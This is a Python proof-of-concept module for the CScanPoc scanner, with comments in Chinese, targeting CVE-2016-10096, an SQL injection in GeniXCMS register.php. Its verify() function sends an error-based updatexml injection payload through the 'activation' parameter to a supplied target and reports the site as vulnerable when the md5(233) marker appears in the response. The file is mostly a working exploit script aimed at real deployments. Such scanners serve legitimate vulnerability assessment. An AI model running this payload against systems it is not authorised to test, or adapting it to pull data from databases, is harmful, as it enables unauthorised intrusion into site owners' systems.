# coding: utf-8

from CScanPoc.thirdparty import requests
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType


class Vuln(ABVuln):
    vuln_id = 'GeniXCMS_0006'  # 平台漏洞编号
    name = 'MetalGenix GeniXCMS SQL注入'  # 漏洞名称
    level = VulnLevel.HIGH  # 漏洞危害级别
    type = VulnType.INJECTION  # 漏洞类型
    disclosure_date = '2017-01-04'  # 漏洞公布时间
    desc = '''
    MetalGenix GeniXCMS1.0.0之前的版本中的register.php文件存在SQL注入漏洞。远程攻击者可借助&lsquo;activation&rsquo;参数利用该漏洞执行SQL命令。
    '''  # 漏洞描述
    ref = 'http://www.cnvd.org.cn/flaw/show/CNVD-2017-00082'
    cnvd_id = 'CNVD-2017-00082'  # cnvd漏洞编号
    cve_id = 'CVE-2016-10096'  # cve编号
    product = 'GeniXCMS'  # 漏洞组件名称
    product_version = '1.0.0'  # 漏洞应用版本


class Poc(ABPoc):
    poc_id = '42f57b1b-3dd0-45e1-b16e-9eb6763ec089'  # 平台 POC 编号
    author = '国光'  # POC编写者
    create_date = '2018-08-01'  # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())
        self.option_schema = {
            'properties': {
                'base_path': {
                    'type': 'string',
                    'description': '部署路径',
                    'default': '',
                    '$default_ref': {
                        'property': 'deploy_path'
                    }
                }
            }
        }

    def verify(self):
        self.target = self.target.rstrip(
            '/') + '/' + (self.get_option('base_path').lstrip('/'))
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))
            arg = '{target}'.format(target=self.target)
            payload = "/register.php?activation=1%27%20and%201=(updatexml(1,concat(md5(233)),1))%23"

            vul_url = arg + payload
            headers = {
                'Content-Type': 'application/x-www-form-urlencoded',
            }
            response = requests.get(vul_url)
            self.output.info("正在构造SQL注入测试语句")
            if response.status_code == 200 and 'e165421110ba03099a1c0393373c5b43' in response.text:
                self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                    target=self.target, name=self.vuln.name))
        except Exception as e:
            self.output.info('执行异常{}'.format(e))

    def exploit(self):
        self.verify()


if __name__ == '__main__':
    Poc().run()
